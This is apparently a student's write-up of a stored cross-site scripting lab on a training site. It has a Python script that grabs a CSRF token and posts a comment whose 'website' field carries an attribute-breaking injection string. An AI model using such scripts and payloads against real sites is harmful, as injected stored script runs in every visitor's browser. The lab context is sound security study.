#Another way to perform a cross-site scripting attack is by leveraging web sites that allow user content to be stored without proper sanitization. This lab contains the canonical stored XSS attack that does so. Within the comments section of the website, one can upload a comment that contains Javascript code. If not properly sanitized, this code will then be executed by any visitor to the site that subsequently accesses the comment. The Python snippet below submits a comment onto the vulnerable site. 
import requests, sys
from bs4 import BeautifulSoup
import urllib.parse
site = 'acd31fc91f464134c10770c900d00034.web-security-academy.net'


def try_post(name, website_link):
    blog_post_url = f'https://{site}/post?postId=1'
    s = requests.Session()
    resp = s.get(blog_post_url)
    soup = BeautifulSoup(resp.text,'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')

    comment_url = f'https://{site}/post/comment'
    comment_data = {
        'csrf' : csrf,
        'postId' : '1',
        'comment' : 'heyYO',
        'name' : name,
        'email' : 'madler@pdx.edu',
        'website': website_link
    }
    resp = s.post(comment_url, data=comment_data)
    print(f'''{comment_url}): {soup.find_all('a', {'id' : 'author'})})''')


try_post("innocuous",'''" https://pdx.edu');//''')